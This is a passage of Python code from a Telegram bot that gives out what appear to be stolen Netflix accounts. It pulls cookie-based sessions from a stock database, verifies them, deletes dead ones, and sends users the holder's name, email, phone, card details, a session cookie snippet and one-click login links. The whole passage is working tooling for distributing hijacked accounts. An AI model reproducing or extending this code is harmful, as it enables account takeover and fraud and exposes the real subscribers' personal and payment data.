            await update.callback_query.message.reply_text(join_text, parse_mode="Markdown", reply_markup=get_join_menu())
        return

    # If triggered via callback, we send a new message or reply to message so it doesn't break
    if update.callback_query:
        status_msg = await update.callback_query.message.reply_text("⏳ <i>Pulling an account from stock and verifying...</i>", parse_mode="HTML")
    else:
        status_msg = await update.message.reply_text("⏳ <i>Pulling an account from stock and verifying...</i>", parse_mode="HTML")

    while True:
        # First try to pick an account this user hasn't received yet
        row = db_query("""
            SELECT * FROM accounts 
            WHERE id NOT IN (SELECT account_id FROM user_claims WHERE user_id = ?) 
            ORDER BY RANDOM() LIMIT 1
        """, (user.id,), "one")

        # If they have received all accounts, fallback to picking any random account from stock
        if not row:
            row = db_query("SELECT * FROM accounts ORDER BY RANDOM() LIMIT 1", fetch="one")

        if not row:
            await status_msg.edit_text("❌ <b>Sorry, stock is currently empty!</b> Please try again later.", parse_mode="HTML")
            return

        acc_id = row["id"]
        cookie_text = row["cookies"]
        cookies = load_cookies(cookie_text)

        acc = await asyncio.to_thread(check_account, cookies, 20)
        if not acc:
            # If the account is dead, remove it completely from database and user claims, then loop again
            db_query("DELETE FROM accounts WHERE id=?", (acc_id,))
            db_query("DELETE FROM user_claims WHERE account_id=?", (acc_id,))
            continue

        # Record that this user received this account so they get a different one next time
        db_query("INSERT OR IGNORE INTO user_claims (user_id, account_id) VALUES (?, ?)", (user.id, acc_id))
        break

    db_query("UPDATE users SET checks_count = checks_count + 1 WHERE user_id=?", (user.id,))

    cc = acc.get("country_code", "XX")
    flag = _flag(cc)
    p = acc.get("profiles", [])
    profs = ", ".join(p[:4]) if p else "N/A"
    pv = "✅" if acc.get("phone_verified") else "❌"
    nf_id = acc.get("netflix_id_raw", "")

    caption = (
        f"🎬 <b>NETFLIX ACCOUNT FOUND</b>\n\n"
        f"👤 <b>{acc['name']}</b>\n"
        f"📧 <code>{acc['email']}</code>\n"
        f"🌍 {acc['country']} {flag} ({cc})\n\n"
        f"📋 <b>{acc['plan']}</b>  •  💰 {acc['price']}\n"
        f"📅 Since: {acc['member_since']}\n"
        f"🗓 Billing: {acc['next_billing']}\n"
        f"🎁 Free Trial: {'Yes' if acc['free_trial'] else 'No'}\n\n"
        f"🎥 {acc['video_quality']}  |  📺 {acc['max_streams']} streams  |  ➕ {acc['extra_slots']} extra\n"
        f"💳 {acc['card_brand']} *{acc['card_last4']}  •  {acc['payment_method']}\n"
        f"📞 {acc['phone']}  {pv}\n"
        f"👥 Profiles ({acc['profile_count']}): {profs}\n\n"
        f"🍪 <b>Cookie Snippet</b>\n"
        f"<code>NetflixId={nf_id[:30]}...</code>\n\n"
        f"➖➖➖➖➖➖➖➖➖➖\n"
        f"➡️ <b>Developer:</b> {OWNER_HANDLE}\n"
        f"🤖 <b>Bot:</b> {BOT_HANDLE}"
    )

    buttons = []
    row1 = []
    if acc.get("login_pc") and acc["login_pc"] != "N/A":
        row1.append(InlineKeyboardButton("🖥 Click to PC", url=acc["login_pc"]))
    if acc.get("login_phone") and acc["login_phone"] != "N/A":
        row1.append(InlineKeyboardButton("📱 Click to Phone", url=acc["login_phone"]))
    if row1:
        buttons.append(row1)
    buttons.append([InlineKeyboardButton("📺 Click to TV", url=acc["login_tv"])])

    reply_markup = InlineKeyboardMarkup(buttons)
    await status_msg.edit_text(caption, parse_mode="HTML", reply_markup=reply_markup)

